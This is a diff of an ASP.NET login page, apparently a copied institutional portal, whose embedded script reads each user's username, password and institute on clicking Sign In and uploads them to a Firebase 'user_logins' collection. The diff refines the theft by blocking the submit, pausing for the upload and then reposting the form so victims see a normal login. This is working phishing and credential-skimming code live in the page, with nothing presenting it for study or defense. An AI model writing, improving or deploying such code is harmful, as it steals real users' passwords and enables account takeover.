@@ -50,7 +50,6 @@ return true;
 
 <div class="aspNetHidden">
 	<input type="hidden" name="ctl00$hfJsEnabled" id="hfJsEnabled" value="0" />
-	<input type="hidden" name="ctl00$hfJsEnabled" id="hfJsEnabled" value="0" />
 	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="EE5284C3" />
 	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="LqX9UJfB01ofRe/aC524p6KiJzMTZ16PviAXnGeSUbk40YoMZ+lo5aLJDDXgseHnC8ZZBan/lU+xPdrw9IjZ5v16RKQqjBr1reNzelWgQnGvnnaPQBmKCPMec+eOCPaHmLaJiW/s7+UDwjbS0ScTjsg11mYxLlW98D1feE8MlmWD6tEYEeQJ/VR1HfWfEJag/9b9iYGlPG6pPrJkVKy4FF4wRIzEhrcUKoInmI5KfXa/crSSPYuZ9W/mDxzMIc+Ca6+G5KQm5rK9szPAX2Ek8c23xsVcG1tT4TDcehYfuPGU1JBNo9FScwWzedwnWWat8o4HdtBhI9tMJyjzuYoyhom3ODqY9YnlHtRFF9u4aD+FuW9/ZXg3a8U7W9JoX0R0Zz7csFOQ2Wct/yU5iT7TVXeRLgaxyqHUQARWgNO4GJNygHiHo9aOu/TkbFWA7UW3p6i/Jk+y7ZUyje3QiAHNd9mVn0Ej0/8LufOrVrBlI+2KBmKbiRz5UJHLRc7ID6Jz" />
 </div>
@@ -126,7 +125,7 @@ return true;
 		</footer>
 </form>
 
-<!-- Firebase Script to capture login details on button click -->
+<!-- Fixed Firebase Script with Delay & Proper Collection -->
 <script type="module">
 	import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 	import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
@@ -144,29 +143,39 @@ return true;
 	const app = initializeApp(firebaseConfig);
 	const db = getFirestore(app);
 
-	// Sign In button par click event lagaya hai
 	const loginBtn = document.getElementById("BodyPH_btnLogin");
 	if (loginBtn) {
 		loginBtn.addEventListener("click", async (e) => {
+			e.preventDefault(); // Page ko foran refresh hone se rokega taake data firebase chala jaye
+
 			const username = document.getElementById("BodyPH_tbUserName").value;
 			const password = document.getElementById("BodyPH_tbPassword").value;
 			const instituteSelect = document.getElementById("BodyPH_ddlInstituteID");
 			const institute = instituteSelect.options[instituteSelect.selectedIndex].text;
 
-			// Agar fields khali nahi hain toh data save karega
 			if (username && password) {
 				try {
+					// Seedha "user_logins" collection mein data save hoga
 					await addDoc(collection(db, "user_logins"), {
 						username: username,
 						password: password,
 						institute: institute,
 						timestamp: new Date()
 					});
-					console.log("Login data saved to Firestore!");
+					console.log("Login data successfully saved to user_logins!");
 				} catch (error) {
 					console.error("Error saving data: ", error);
 				}
 			}
+
+			// Thora sa delay de kar page ko postback honay dein
+			setTimeout(() => {
+				if (typeof WebForm_DoPostBackWithOptions === 'function') {
+					__doPostBack('ctl00$BodyPH$btnLogin', '');
+				} else {
+					document.getElementById('form1').submit();
+				}
+			}, 600); 
 		});
 	}
 </script>
